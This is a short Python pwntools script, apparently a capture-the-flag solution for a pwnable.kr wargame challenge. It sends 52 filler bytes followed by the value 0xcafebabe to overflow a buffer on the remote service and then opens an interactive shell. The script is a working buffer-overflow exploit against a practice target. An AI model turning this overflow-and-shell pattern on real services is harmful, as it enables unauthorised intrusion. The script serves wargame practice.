# writeup is on the way. stay tuned.
# @zeifan
from pwn import *

target = "pwnable.kr"
port = 9000
magic_str = 0xcafebabe

r = remote(target,port)
r.send("A" * 52 + p32(magic_str)+ "\n")
r.interactive()
